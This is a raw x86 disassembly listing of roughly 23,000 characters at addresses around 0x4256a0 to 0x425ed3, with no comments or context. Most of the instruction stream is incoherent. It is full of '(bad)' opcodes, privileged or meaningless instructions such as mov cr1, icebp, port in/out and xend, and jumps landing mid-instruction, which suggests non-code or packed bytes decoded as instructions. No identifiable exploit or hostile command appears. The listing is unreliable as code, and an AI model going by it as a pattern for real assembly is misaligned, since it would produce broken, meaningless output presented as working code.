  4256a0:	lock mov dl,BYTE PTR [ebx-0x4]
  4256a4:	push   ebx
  4256a5:	sub    dh,BYTE PTR [edx-0x454df37a]
  4256ab:	sub    edi,edi
  4256ad:	mov    dl,0xec
  4256af:	ja     0x425679
  4256b1:	push   eax
  4256b2:	ja     0x42567c
  4256b4:	xor    BYTE PTR [edi-0x79],0x80
  4256b8:	lock xchg DWORD PTR [ebx+0x2a],edx
  4256bc:	mov    dl,0xba
  4256be:	sub    DWORD PTR [ebx-0x4],edx
  4256c1:	mov    dl,0x86
  4256c3:	or     al,0xff
  4256c5:	mov    dl,0x80
  4256c7:	lock mov al,BYTE PTR [eax+0x51538a97]
  4256ce:	push   ebx
  4256cf:	pushf  
  4256d0:	mov    dl,0xbe
  4256d2:	or     al,0xb2
  4256d4:	clc    
  4256d5:	sub    edi,edi
  4256d7:	inc    BYTE PTR [ebx-0x4e]
  4256da:	xor    al,0xc8
  4256dd:	arpl   bp,di
  4256df:	fstp   DWORD PTR [edx]
  4256e1:	xor    BYTE PTR [edi-0x7],0x80
  4256e5:	lock stc 
  4256e7:	push   ebx
  4256e8:	cld    
  4256e9:	push   ebx
  4256ea:	sub    dh,BYTE PTR [edx-0x454df37a]
  4256f0:	sub    edi,edi
  4256f2:	mov    dl,0x50
  4256f4:	ja     0x425681
  4256f6:	jl     0x42576f
  4256f8:	xchg   DWORD PTR [edx-0x7fc790e2],ebp
  4256fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256ff:	mov    esi,0x8d8d8dcd
  425704:	xor    al,0x83
  425707:	xor    BYTE PTR [edi-0x7d],0x53
  42570b:	jl     0x4256bf
  42570d:	test   BYTE PTR [ecx],ch
  42570f:	push   ebx
  425710:	push   ecx
  425711:	mov    dl,0xbe
  425713:	or     al,0xff
  425715:	std    
  425716:	xor    BYTE PTR [edi-0x75],0x94
  42571a:	xchg   BYTE PTR [eax+0x77],dl
  42571d:	add    BYTE PTR [eax-0x72701089],0x10
  425724:	ja     0x4256ea
  425726:	(bad)  
  425727:	ja     0x4256ed
  425729:	xor    al,0x8b
  42572c:	or     eax,esp
  42572e:	push   0x53
  425730:	mov    dl,0x50
  425732:	ja     0x4256fc
  425734:	xor    BYTE PTR [edi-0x79],0x80
  425738:	lock xchg DWORD PTR [ebx-0x4],edx
  42573c:	mov    dl,0x86
  42573e:	or     al,0x53
  425740:	sub    dh,BYTE PTR [edx-0x4d00d646]
  425746:	xor    al,0xc8
  425749:	xor    esi,DWORD PTR [edx-0x7db0f080]
  42574f:	push   es
  425750:	dec    ebp
  425751:	dec    ebp
  425752:	xor    al,0x82
  425755:	push   ebx
  425756:	mov    dl,0x50
  425758:	ja     0x4256e5
  42575a:	xor    BYTE PTR [edi-0x76],0x80
  42575e:	lock mov dl,BYTE PTR [ebx-0x4]
  425762:	push   ebx
  425763:	sub    dh,BYTE PTR [edx-0x454df37a]
  425769:	sub    edi,edi
  42576b:	mov    dl,0x3a
  42576d:	ja     0x42575e
  42576f:	xor    BYTE PTR [edi-0x76],0x80
  425773:	lock mov dl,BYTE PTR [ebx-0x4]
  425777:	push   ebx
  425778:	sub    dh,BYTE PTR [edx-0x454df37a]
  42577e:	sub    edi,edi
  425780:	mov    dl,0x3f
  425782:	ja     0x425708
  425784:	xor    BYTE PTR [edi+0x32],0x80
  425788:	lock xor dl,BYTE PTR [ebx+0x2a]
  42578c:	push   ebx
  42578d:	cld    
  42578e:	mov    dl,0xba
  425790:	sub    DWORD PTR [edx-0x4d00f37a],esi
  425796:	xor    al,0x84
  425799:	arpl   bp,di
  42579b:	or     DWORD PTR [edi-0x4d],ecx
  42579e:	dec    ebp
  42579f:	dec    ebp
  4257a0:	dec    ebp
  4257a1:	xor    BYTE PTR [edi-0x7],0x80
  4257a5:	lock stc 
  4257a7:	push   ebx
  4257a8:	cld    
  4257a9:	push   ebx
  4257aa:	sub    dh,BYTE PTR [edx-0x794dd646]
  4257b0:	or     al,0xab
  4257b2:	push   DWORD PTR [edx-0x56740f80]
  4257b8:	push   ebx
  4257b9:	mov    dl,0xa3
  4257bb:	jo     0x4257b8
  4257bd:	out    dx,al
  4257be:	lea    edx,[edi-0x78127880]
  4257c4:	jno    0x425819
  4257c6:	jo     0x42575b
  4257c8:	fwait
  4257c9:	pop    edi
  4257ca:	lock out dx,eax
  4257cc:	or     DWORD PTR [edi],ecx
  4257ce:	pop    esp
  4257cf:	lea    ecx,[ebp+0x905638d]
  4257d5:	mov    cr1,ebp
  4257d8:	lea    ecx,[ebp+0x2d995c09]
  4257de:	pop    esi
  4257df:	and    al,0x38
  4257e1:	lea    ecx,[ebp+0x508af050]
  4257e7:	lock xor dl,BYTE PTR [ebx-0x9]
  4257eb:	push   eax
  4257ec:	lock mov edi,DWORD PTR [ecx-0x49460180]
  4257f3:	jo     0x425848
  4257f5:	dec    ebp
  4257f6:	jl     0x42586f
  4257f8:	enter  0x4d07,0x4d
  4257fc:	dec    ebp
  4257fd:	mov    ecx,0xc5d3cb63
  425802:	mov    ecx,0xb98ae780
  425807:	mov    dh,0x7c
  425809:	mov    ecx,0x5c098b53
  42580e:	lock mov eax,DWORD PTR [ecx]
  425811:	and    esp,ebx
  425813:	mov    ecx,0xd70cdf5f
  425818:	pop    ebx
  425819:	or     DWORD PTR [eax+esi*1+0x50],ebx
  42581d:	lock enter 0x63b9,0xfd
  425822:	xlat   BYTE PTR ds:[ebx]
  425823:	iret   
  425824:	or     DWORD PTR [eax+esi*8-0x76],ebx
  425828:	and    BYTE PTR [edi+0x1f65cdef],0x8d
  42582f:	aad    0x53
  425831:	or     DWORD PTR [eax+esi*8-0x76],ebx
  425835:	and    BYTE PTR [edi-0x5f64611],0x21
  42583c:	pop    ds
  42583d:	mov    ecx,0x53b9b2b6
  425842:	std    
  425843:	mov    ecx,0xd5c8f05f
  425848:	and    edi,DWORD PTR [edi+esi*2-0x38]
  42584c:	xchg   BYTE PTR [ebp+0x4d],cl
  42584f:	dec    ebp
  425850:	dec    ebp
  425851:	ja     0x4257de
  425853:	cmp    ch,0xb9
  425856:	push   ebx
  425857:	mov    cl,0x2d
  425859:	mov    ecx,0x5fb970b6
  42585e:	lock mov esp,esp
  425861:	cmc    
  425862:	les    esp,FWORD PTR [esi+0x7c32774d]
  425868:	ja     0x425832
  42586a:	mov    esi,0x94d4d4d
  42586f:	pop    esp
  425870:	out    0x8a,eax
  425872:	and    BYTE PTR [edi+0x5d7053ef],0x21
  425879:	sub    edx,ebp
  42587b:	pop    ss
  42587c:	dec    ebp
  42587d:	ja     0x425809
  42587f:	in     eax,dx
  425880:	out    0xc8,eax
  425882:	xchg   BYTE PTR [ecx],cl
  425884:	dec    edi
  425885:	ror    BYTE PTR [ebp+0x4d],1
  425888:	dec    ebp
  425889:	push   ebx
  42588a:	push   0xffffffab
  42588c:	mov    ds:0x8deefb70,eax
  425891:	xor    al,0x32
  425894:	mov    ecx,0x53b9b2b6
  425899:	std    
  42589a:	push   ebx
  42589b:	push   0xffffffb9
  42589d:	arpl   WORD PTR [ecx+0x6a16092d],si
  4258a3:	les    eax,FWORD PTR [edx]
  4258a5:	xchg   edi,eax
  4258a6:	add    BYTE PTR [edi-0x6c427813],0x99
  4258ad:	fwait
  4258ae:	loop   0x4258f5
  4258b0:	dec    ebp
  4258b1:	xlat   BYTE PTR ds:[ebx]
  4258b2:	out    dx,eax
  4258b3:	xor    BYTE PTR [edx],0x86
  4258b6:	inc    ebx
  4258b7:	mov    ecx,DWORD PTR [ebp+0x4d]
  4258ba:	add    DWORD PTR [ecx-0x40],edi
  4258bd:	push   eax
  4258be:	ja     0x4258e6
  4258c0:	add    DWORD PTR [ecx+0x75],edi
  4258c3:	push   eax
  4258c4:	ja     0x4258f4
  4258c6:	add    DWORD PTR [ecx-0x47],edi
  4258c9:	push   eax
  4258ca:	ja     0x425902
  4258cc:	add    DWORD PTR [eax+edx*1-0x73],ecx
  4258d0:	lea    ecx,[ebp+0x13e7750]
  4258d6:	dec    esp
  4258d7:	cmc    
  4258d8:	lea    ecx,[ebp+0x4677508d]
  4258de:	add    DWORD PTR [edi+ebp*4-0x73],ecx
  4258e2:	lea    ecx,[ebp+0x1627750]
  4258e8:	dec    esp
  4258e9:	mov    BYTE PTR [ebp+0x77508d8d],cl
  4258ef:	push   esi
  4258f0:	add    DWORD PTR [ecx+esi*2+0x3a],ecx
  4258f4:	lea    ecx,[ebp+0x15e7750]
  4258fa:	dec    esp
  4258fb:	aam    0x3a
  4258fd:	lea    ecx,[ebp+0x50667750]
  425903:	xlat   BYTE PTR ds:[ebx]
  425904:	push   ds
  425905:	add    DWORD PTR [ebp+edx*4+0x3a],ecx
  425909:	lea    ecx,[ebp-0x7f9588b0]
  42590f:	dec    esp
  425910:	cmp    cl,BYTE PTR ds:[ebp+0x5381808d]
  425917:	jb     0x425969
  425919:	xchg   edi,eax
  42591a:	not    DWORD PTR [eax-0x69]
  42591d:	jp     0x42596f
  42591f:	xchg   edi,eax
  425920:	adc    BYTE PTR [eax-0x69],0x83
  425924:	jl     0x42599d
  425926:	std    
  425927:	(bad)  [esi-0x79a1ee21]
  42592d:	pop    DWORD PTR [ebx+0x26]
  425930:	push   eax
  425931:	ja     0x4258e2
  425933:	xor    al,0xfd
  425936:	and    bh,0xaf
  425939:	push   ebx
  42593a:	mov    esp,DWORD PTR [edx-0x20a724fb]
  425940:	adc    DWORD PTR [ecx],ecx
  425942:	inc    esi
  425943:	retf   
  425944:	or     al,0xb2
  425946:	popa   
  425947:	or     al,0x50
  425949:	out    0xf9,eax
  42594b:	and    bh,0xfd
  42594e:	and    BYTE PTR [edi+0x53ac80af],0x4d
  425955:	push   ebx
  425956:	test   DWORD PTR [edx+0x2aff29b4],esi
  42595c:	and    bh,0xf9
  42595f:	icebp  
  425960:	lea    ecx,[ebp+0x353cd8d]
  425966:	inc    DWORD PTR [esi]
  425968:	jmp    FWORD PTR [edx]
  42596a:	push   eax
  42596b:	xlat   BYTE PTR ds:[ebx]
  42596c:	mov    ecx,DWORD PTR [ecx]
  42596e:	(bad)  
  425970:	lea    ecx,[ebp-0x8885d73]
  425976:	rcr    ebp,0x86
  425979:	outs   dx,DWORD PTR ds:[esi]
  42597a:	pusha  
  42597b:	mov    esi,0xe26438f
  425980:	lock jp 0x425925
  425983:	ja     0x425907
  425985:	rcr    ebp,0x52
  425988:	or     al,0xe
  42598a:	lock add DWORD PTR [eax-0x287f0210],0xffffffaf
  425992:	and    bh,0xfd
  425995:	and    BYTE PTR [edi-0x5dcdac51],0x5
  42599c:	fistp  DWORD PTR [eax-0x21]
  42599f:	adc    DWORD PTR [ecx],ecx
  4259a1:	inc    esi
  4259a2:	add    eax,0x29bcb20c
  4259a7:	mov    dl,0x88
  4259a9:	or     al,0x53
  4259ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259ac:	push   ebx
  4259ad:	test   edi,edi
  4259af:	adc    edi,edi
  4259b1:	dec    ebx
  4259b2:	in     eax,dx
  4259b3:	mov    dl,0x4d
  4259b5:	in     eax,dx
  4259b6:	jle    0x425a05
  4259b8:	push   eax
  4259b9:	lock std 
  4259bb:	push   eax
  4259bc:	xlat   BYTE PTR ds:[ebx]
  4259bd:	scas   eax,DWORD PTR es:[edi]
  4259be:	xor    al,0xf7
  4259c1:	push   eax
  4259c3:	jp     0x42599a
  4259c5:	and    esp,DWORD PTR [edx+0x36ff777]
  4259cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259cc:	retf   
  4259cd:	pusha  
  4259ce:	sbb    edi,edx
  4259d0:	jp     0x425985
  4259d2:	push   cs
  4259d3:	lock jp 0x425978
  4259d6:	ja     0x42595a
  4259d8:	sti    
  4259d9:	jl     0x4259b7
  4259db:	int3   
  4259dc:	push   cs
  4259dd:	lock add esp,0x1d
  4259e1:	mov    ds:0xddc1f7f0,al
  4259e6:	xchg   BYTE PTR [ecx+0x30],bh
  4259e9:	ja     0x425a65
  4259eb:	mov    ds:0xddc182b7,al
  4259f0:	push   edx
  4259f1:	jmp    0x438f:0xbe83b7a2
  4259f8:	es xor al,0xfd
  4259fc:	xor    al,0xaf
  4259ff:	and    bh,0xfd
  425a02:	and    BYTE PTR [edi+0x63609af],0xc
  425a09:	mov    dl,0xbe
  425a0b:	sub    DWORD PTR [ebx+0xb],edx
  425a0e:	inc    esi
  425a10:	mov    dl,0xbc
  425a12:	or     al,0xff
  425a14:	sub    ah,BYTE PTR [edx-0x20a726fb]
  425a1a:	adc    DWORD PTR [eax-0x10],edx
  425a1d:	std    
  425a1e:	push   ebx
  425a1f:	xor    dl,BYTE PTR [eax-0x29]
  425a22:	scas   eax,DWORD PTR es:[edi]
  425a23:	xor    al,0xfd
  425a26:	adc    bh,0xaf
  425a29:	and    bh,0xfd
  425a2c:	and    BYTE PTR [edi-0x5dcdac51],0x5
  425a33:	fistp  DWORD PTR [eax-0x21]
  425a36:	adc    DWORD PTR [ecx],ecx
  425a38:	inc    esi
  425a39:	add    eax,0x29bcb20c
  425a3e:	mov    dl,0x88
  425a40:	or     al,0x53
  425a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a43:	push   ebx
  425a44:	test   edi,edi
  425a46:	adc    edi,edi
  425a48:	dec    ebx
  425a49:	call   DWORD PTR [ecx+0x9]
  425a4c:	dec    edi
  425a4d:	ror    BYTE PTR [ebp+0x4d],0x4d
  425a51:	adc    bh,0x8b
  425a54:	dec    edi
  425a55:	or     ecx,DWORD PTR [ecx]
  425a57:	mov    cr1,ebp
  425a5a:	lea    ecx,[ebp-0x7f9a8680]
  425a60:	in     eax,0x81
  425a62:	fucomp st(4)
  425a64:	or     eax,0x80359b80
  425a69:	leave  
  425a6a:	and    eax,0x802d7b80
  425a6f:	stos   DWORD PTR es:[edi],eax
  425a70:	sbb    eax,0x97507eec
  425a75:	scas   eax,DWORD PTR es:[edi]
  425a76:	sbb    BYTE PTR [ebx-0x13ae13eb],0xfc
  425a7d:	push   eax
  425a7e:	lock xchg DWORD PTR [eax+0x77],edx
  425a82:	jp     0x425ad4
  425a84:	xchg   edi,eax
  425a85:	enter  0x9463,0xdb
  425a89:	in     al,dx
  425a8a:	push   eax
  425a8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a8c:	enter  0x7253,0x50
  425a90:	xchg   edi,eax
  425a91:	sbb    DWORD PTR [edi-0x69],0xffffffc8
  425a95:	(bad)  
  425a97:	(bad)  
  425a98:	in     al,dx
  425a99:	xor    BYTE PTR [edi+0x7a],0x80
  425a9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a9e:	scas   eax,DWORD PTR es:[edi]
  425a9f:	or     DWORD PTR [ebp+eiz*1-0x6d],ebx
  425aa3:	arpl   WORD PTR [ebx+0x63b3d31d],bx
  425aa9:	stos   DWORD PTR es:[edi],eax
  425aaa:	adc    eax,0xee80a9d3
  425aaf:	pop    edx
  425ab0:	adc    BYTE PTR [edi+0x202580ef],0x50
  425ab7:	xchg   edi,eax
  425ab8:	mov    ch,ah
  425aba:	cld    
  425abb:	add    DWORD PTR [edi+0x4304ec1e],edx
  425ac1:	xchg   edi,eax
  425ac2:	out    dx,eax
  425ac3:	push   eax
  425ac4:	ja     0x425af8
  425ac6:	push   eax
  425ac7:	xchg   edi,eax
  425ac8:	jbe    0x425b46
  425aca:	ja     0x425ac5
  425acc:	dec    DWORD PTR [ebp-0x687f7273]
  425ad2:	mov    ch,ch
  425ad4:	(bad)  
  425ad5:	(bad)  
  425ad6:	xlat   BYTE PTR ds:[ebx]
  425ad7:	sub    DWORD PTR [edx],ecx
  425ad9:	xor    BYTE PTR [edi+0x76],0x80
  425add:	push   ebp
  425ade:	jno    0x425a66
  425ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ae1:	mov    cl,BYTE PTR [ebp+0x4d]
  425ae4:	adc    bh,0x8b
  425ae7:	xor    al,0x87
  425aea:	dec    edi
  425aeb:	push   0xffffffd5
  425aed:	das    
  425aee:	xor    BYTE PTR [edi-0x76],0x50
  425af2:	sbb    eax,0xed327780
  425af7:	ja     0x425a83
  425af9:	out    dx,al
  425afa:	dec    ebp
  425afb:	lock stc 
  425afd:	xlat   BYTE PTR ds:[ebx]
  425afe:	mov    dh,0x80
  425b00:	xchg   edi,eax
  425b01:	sbb    eax,0x50
  425b04:	xchg   edi,eax
  425b05:	and    DWORD PTR [ebx-0x69],0xffffffc8
  425b09:	in     al,0xdc
  425b0b:	stos   DWORD PTR es:[edi],eax
  425b0c:	cmp    ah,0xa9
  425b0f:	mov    ds:0x8deefb70,eax
  425b14:	xchg   edi,eax
  425b15:	add    BYTE PTR [edi-0x10287f67],0x4d
  425b1c:	loopne 0x425b50
  425b1e:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  425b24:	xchg   ch,ah
  425b26:	int3   
  425b27:	dec    ebp
  425b28:	dec    ebp
  425b29:	or     BYTE PTR [esi+edi*1+0x3a],0x8d
  425b2e:	lea    edx,[ebx+0x70]
  425b31:	pop    edi
  425b32:	out    dx,eax
  425b33:	test   eax,0x80b21809
  425b38:	mov    dl,0xa7
  425b3a:	sti    
  425b3b:	out    dx,al
  425b3c:	lea    eax,[eax-0x72c5e1e4]
  425b42:	lea    edx,[ebx+0x5e328099]
  425b48:	and    al,0x38
  425b4a:	lea    ecx,[ebp-0x2ac5e3c]
  425b50:	mov    ecx,0x50b970b6
  425b55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b56:	in     eax,dx
  425b57:	sti    
  425b58:	or     al,0xed
  425b5a:	cld    
  425b5b:	or     al,0x9
  425b5d:	pop    esp
  425b5e:	mov    eax,ds:0xd7fd63b9
  425b63:	pop    es
  425b64:	push   ebx
  425b65:	push   0xffffffa9
  425b67:	mov    ecx,0xce800c50
  425b6c:	push   ds
  425b6d:	cmp    cl,BYTE PTR [ebp-0x648b5c73]
  425b73:	or     BYTE PTR [ebx+0x3a1e4c80],0x8d
  425b7a:	lea    esi,[edx+0x7cec6fbc]
  425b80:	les    esp,FWORD PTR [esi-0x3232fa33]
  425b86:	mov    esi,0x6def10bd
  425b8b:	fmul   DWORD PTR [edi-0x7934325a]
  425b91:	xlat   BYTE PTR ds:[ebx]
  425b92:	popa   
  425b93:	cld    
  425b94:	lea    ecx,[ebp+0x3a1e4c80]
  425b9a:	lea    ecx,[ebp+0x74ab7cec]
  425ba0:	xchg   edi,eax
  425ba1:	add    BYTE PTR [edi-0x72a5785e],0x8d
  425ba8:	lea    edx,[ebx+0x438f8660]
  425bae:	es cdq 
  425bb0:	fwait
  425bb1:	jl     0x425c2a
  425bb3:	enter  0x58e4,0xdf
  425bb7:	adc    DWORD PTR [eax-0x10],edx
  425bba:	mov    edi,DWORD PTR [edi+esi*2-0x79]
  425bbe:	fstp   DWORD PTR [eax-0x21]
  425bc1:	adc    DWORD PTR [eax-0x10],edx
  425bc4:	xor    dl,BYTE PTR [ebx+0x6a]
  425bc7:	jl     0x425c40
  425bc9:	xchg   dh,dh
  425bcb:	and    al,0x6f
  425bcd:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  425bd1:	cmc    
  425bd2:	and    al,0x6f
  425bd4:	cmp    BYTE PTR [edi+esi*2-0x9],bh
  425bd8:	call   0x50543b35
  425bdd:	lock jp 0x425c5c
  425be0:	ja     0x425c40
  425be2:	out    0x58,al
  425be4:	fist   WORD PTR [ecx]
  425be6:	push   eax
  425be7:	lock data16 xor BYTE PTR [edi-0x79],0x80
  425bed:	xchg   edi,eax
  425bee:	xor    cl,BYTE PTR [ecx]
  425bf0:	inc    esi
  425bf1:	test   DWORD PTR [edx+esi*4],0x97800c07
  425bf8:	xchg   DWORD PTR [eax-0x74dcd29],eax
  425bfe:	sub    DWORD PTR [edi+eiz*4-0x39],ebp
  425c02:	add    al,0xd4
  425c04:	push   ebx
  425c05:	jl     0x425c5a
  425c07:	or     edi,edi
  425c09:	cld    
  425c0a:	push   eax
  425c0b:	ja     0x425b90
  425c0d:	add    DWORD PTR [edi-0x7c],esi
  425c10:	push   eax
  425c11:	ja     0x425bc2
  425c13:	xor    BYTE PTR [edi-0x51],0xfa
  425c17:	and    ah,BYTE PTR [edi+ebp*2]
  425c1a:	cmp    BYTE PTR [ebp+ecx*4-0x47],bh
  425c1e:	pop    eax
  425c1f:	fist   WORD PTR [ecx]
  425c21:	push   eax
  425c22:	jge    0x425c12
  425c24:	xor    al,0x8a
  425c27:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  425c2e:	or     al,0xe2
  425c30:	or     eax,0xb2f7539d
  425c35:	clc    
  425c36:	sub    edi,edi
  425c38:	inc    BYTE PTR [eax-0x587f7569]
  425c3e:	mov    dl,BYTE PTR [ebx+0x7e]
  425c41:	mov    dl,0x7
  425c43:	or     al,0x53
  425c45:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c4c:	inc    BYTE PTR [eax-0x587f7569]
  425c52:	mov    dl,BYTE PTR [ebx+0x7e]
  425c55:	mov    dl,0x7
  425c57:	or     al,0x53
  425c59:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c60:	inc    BYTE PTR [eax-0x587f7569]
  425c66:	mov    dl,BYTE PTR [ebx+0x7e]
  425c69:	mov    dl,0x7
  425c6b:	or     al,0x53
  425c6d:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c74:	(bad)  
  425c75:	push   eax
  425c76:	add    DWORD PTR [edx+0x4d],edx
  425c79:	dec    ebp
  425c7a:	dec    ebp
  425c7b:	xor    al,0x86
  425c7e:	adc    BYTE PTR [edi+0x53f75386],0x51
  425c85:	mov    dl,0xf8
  425c87:	sub    DWORD PTR [edx-0x100f342],esi
  425c8d:	adc    BYTE PTR [edi-0x79587f7a],0x53
  425c94:	jle    0x425ce9
  425c96:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  425c9d:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425ca4:	dec    ebp
  425ca5:	dec    ebp
  425ca6:	xor    al,0x21
  425ca9:	xor    BYTE PTR [eax],0x80
  425cac:	xchg   edi,eax
  425cad:	mov    al,BYTE PTR [eax+0x7f808aa7]
  425cb3:	or     dl,BYTE PTR [ebx-0x7e]
  425cb6:	push   ebx
  425cb7:	jle    0x425c6b
  425cb9:	pop    es
  425cba:	or     al,0xb2
  425cbc:	mov    ah,0x29
  425cbe:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425cc5:	dec    ebp
  425cc6:	dec    ebp
  425cc7:	xor    al,0x71
  425cca:	adc    BYTE PTR [edi+0x53f75371],0x51
  425cd1:	mov    dl,0xf8
  425cd3:	sub    DWORD PTR [edx-0x100f342],esi
  425cd9:	adc    BYTE PTR [edi-0x75587f76],0x53
  425ce0:	add    BYTE PTR [eax+0x7e538a77],0xb2
  425ce7:	pop    es
  425ce8:	or     al,0xb2
  425cea:	mov    ah,0x29
  425cec:	call   DWORD PTR [eax+eax*4-0x3ac7559]
  425cf3:	mov    dl,0x86
  425cf5:	or     al,0xed
  425cf7:	(bad)  
  425cf8:	or     eax,0xff29b4b2
  425cfd:	je     0x425ceb
  425cff:	test   DWORD PTR [eax+0x41501577],0x4d4dd518
  425d09:	dec    ebp
  425d0a:	xor    al,0x15
  425d0d:	in     eax,dx
  425d0e:	add    eax,0x29bab20d
  425d13:	push   ebx
  425d14:	cld    
  425d15:	mov    dl,0x86
  425d17:	or     al,0xff
  425d19:	mov    dl,0x80
  425d1b:	lock mov al,BYTE PTR [eax-0x3d127569]
  425d22:	or     eax,0xf8b25153
  425d27:	sub    DWORD PTR [edx-0x100f342],esi
  425d2d:	adc    BYTE PTR [edi-0x75587f76],0x53
  425d34:	jle    0x425d23
  425d36:	(bad)  
  425d37:	or     eax,0xb20c07b2
  425d3c:	mov    ah,0x29
  425d3e:	call   DWORD PTR [esp+ebp*8-0x75687f02]
  425d45:	and    BYTE PTR [edi-0x1281ac76],0xc6
  425d4c:	or     eax,0xb229b4b2
  425d51:	pop    es
  425d52:	or     al,0xff
  425d54:	xchg   esp,eax
  425d55:	in     al,dx
  425d56:	(bad)  
  425d57:	push   eax
  425d58:	xend   
  425d5b:	dec    ebp
  425d5c:	dec    ebp
  425d5d:	dec    ebp
  425d5e:	add    DWORD PTR [edi+0x52],ecx
  425d61:	dec    ebp
  425d62:	dec    ebp
  425d63:	dec    ebp
  425d64:	or     al,BYTE PTR [eax-0xf7f7589]
  425d6a:	mov    ah,dl
  425d6c:	or     eax,0x53fc53a3
  425d71:	adc    DWORD PTR [edx-0x454df37a],esi
  425d77:	sub    edi,edi
  425d79:	mov    dl,0xa
  425d7b:	xor    BYTE PTR [edi+0x2d],0x1
  425d7f:	adc    ch,dh
  425d81:	lea    ecx,[ebp-0x327f6973]
  425d87:	cmp    cl,BYTE PTR ds:[ebp+0x4d814d8d]
  425d8e:	xchg   edi,eax
  425d8f:	and    eax,0x5055f080
  425d94:	cmp    al,BYTE PTR [eax-0xf7f7b89]
  425d9a:	stc    
  425d9b:	or     DWORD PTR [esi-0x3],eax
  425d9e:	or     al,0xb2
  425da0:	mov    esi,0x84f0800c
  425da5:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425dac:	push   edi
  425dae:	stos   BYTE PTR es:[edi],al
  425daf:	dec    ebp
  425db0:	xlat   BYTE PTR ds:[ebx]
  425db1:	xor    eax,0x4d29bab2
  425db6:	xlat   BYTE PTR ds:[ebx]
  425db7:	inc    ebp
  425db8:	xchg   ah,cl
  425dba:	add    eax,0x77804d4d
  425dbf:	test   BYTE PTR [eax+0x4609f9f0],al
  425dc5:	std    
  425dc6:	or     al,0xb2
  425dc8:	mov    esi,0x84f0800c
  425dcd:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425dd4:	push   edi
  425dd6:	stos   BYTE PTR es:[edi],al
  425dd7:	dec    ebp
  425dd8:	xlat   BYTE PTR ds:[ebx]
  425dd9:	push   ebp
  425dda:	mov    dl,0xba
  425ddc:	sub    DWORD PTR [ebp-0x29],ecx
  425ddf:	cmp    eax,0x4d059886
  425de4:	dec    ebp
  425de5:	xor    BYTE PTR [edi-0x76],0x80
  425de9:	lock mov dl,BYTE PTR [ebx+0x11]
  425ded:	mov    dl,0xba
  425def:	sub    DWORD PTR [ebx-0x4],edx
  425df2:	mov    dl,0x86
  425df4:	or     al,0xff
  425df6:	mov    dl,0x80
  425df8:	lock mov al,BYTE PTR [eax+0x51538a97]
  425dff:	mov    dl,0xbe
  425e01:	or     al,0x53
  425e03:	xchg   esp,eax
  425e04:	mov    dl,0xf8
  425e06:	sub    edi,edi
  425e08:	(bad)  
  425e09:	in     al,dx
  425e0a:	mov    dl,0x80
  425e0c:	lock mov al,BYTE PTR [eax+0x51538a97]
  425e13:	mov    dl,0xbe
  425e15:	or     al,0x53
  425e17:	xchg   esp,eax
  425e18:	mov    dl,0xf8
  425e1a:	sub    edi,edi
  425e1c:	(bad)  
  425e1d:	in     al,dx
  425e1e:	mov    dl,0x80
  425e20:	lock mov al,BYTE PTR [eax+0x51538a97]
  425e27:	mov    dl,0xbe
  425e29:	or     al,0x53
  425e2b:	xchg   esp,eax
  425e2c:	mov    dl,0xf8
  425e2e:	sub    edi,edi
  425e30:	(bad)  
  425e31:	in     al,dx
  425e32:	mov    dl,0x50
  425e34:	dec    edi
  425e35:	push   edx
  425e36:	dec    ebp
  425e37:	dec    ebp
  425e38:	dec    ebp
  425e39:	xor    BYTE PTR [edi+0x55],0x80
  425e3d:	lea    eax,[eax-0x687f7910]
  425e43:	xchg   BYTE PTR [ebx+0x51],dl
  425e46:	push   ebx
  425e47:	xchg   esp,eax
  425e48:	mov    dl,0xbe
  425e4a:	or     al,0xb2
  425e4c:	clc    
  425e4d:	sub    edi,edi
  425e4f:	(bad)  
  425e50:	push   eax
  425e51:	xend   
  425e54:	dec    ebp
  425e55:	dec    ebp
  425e56:	dec    ebp
  425e57:	xor    BYTE PTR [edi+0x21],0x80
  425e5b:	lea    eax,[eax-0x687f7510]
  425e61:	mov    dl,BYTE PTR [ebx+0x51]
  425e64:	mov    dl,0xbe
  425e66:	or     al,0x80
  425e68:	ins    DWORD PTR es:[edi],dx
  425e69:	or     dl,BYTE PTR [ebx-0x6c]
  425e6c:	mov    dl,0xf8
  425e6e:	sub    edi,edi
  425e70:	(bad)  
  425e71:	push   eax
  425e72:	xend   
  425e75:	dec    ebp
  425e76:	dec    ebp
  425e77:	dec    ebp
  425e78:	xor    BYTE PTR [edi+0x1d],0x80
  425e7c:	lock sbb eax,0xbab21153
  425e82:	sub    DWORD PTR [ebx-0x4],edx
  425e85:	mov    dl,0x86
  425e87:	or     al,0xff
  425e89:	mov    dl,0x80
  425e8b:	lock mov al,BYTE PTR [eax-0x6bac7569]
  425e92:	push   ebx
  425e93:	push   ecx
  425e94:	mov    dl,0xf8
  425e96:	sub    DWORD PTR [edx-0x100f342],esi
  425e9c:	adc    BYTE PTR [edi-0x75587f76],0x53
  425ea3:	jle    0x425e57
  425ea5:	pop    es
  425ea6:	or     al,0xed
  425ea8:	(bad)  
  425ea9:	or     eax,0xff29b4b2
  425eae:	xchg   esp,eax
  425eaf:	in     al,dx
  425eb0:	(bad)  
  425eb1:	push   eax
  425eb2:	xend   
  425eb5:	dec    ebp
  425eb6:	dec    ebp
  425eb7:	dec    ebp
  425eb8:	xor    BYTE PTR [edi-0x76],0x80
  425ebc:	lock mov ch,ch
  425ebf:	add    eax,0x29bab20d
  425ec4:	push   ebx
  425ec5:	cld    
  425ec6:	mov    dl,0x86
  425ec8:	or     al,0xff
  425eca:	mov    dl,0x80
  425ecc:	lock mov al,BYTE PTR [eax-0x3d127569]
  425ed3:	or     eax,0xf8b25153
